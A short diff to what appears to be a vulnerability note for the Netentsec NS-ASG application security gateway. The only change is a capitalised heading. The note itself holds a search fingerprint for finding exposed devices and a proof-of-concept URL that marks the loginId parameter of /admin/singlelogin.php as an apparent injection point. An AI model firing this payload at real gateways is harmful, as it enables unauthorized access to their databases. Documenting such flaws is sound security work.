@@ -6,7 +6,7 @@
 app="网康NS-ASG应用安全网关"
 ```
 
-## poc
+## POC
 ```
 http://ip/admin/singlelogin.php?submit=1&loginId=1*
 ```
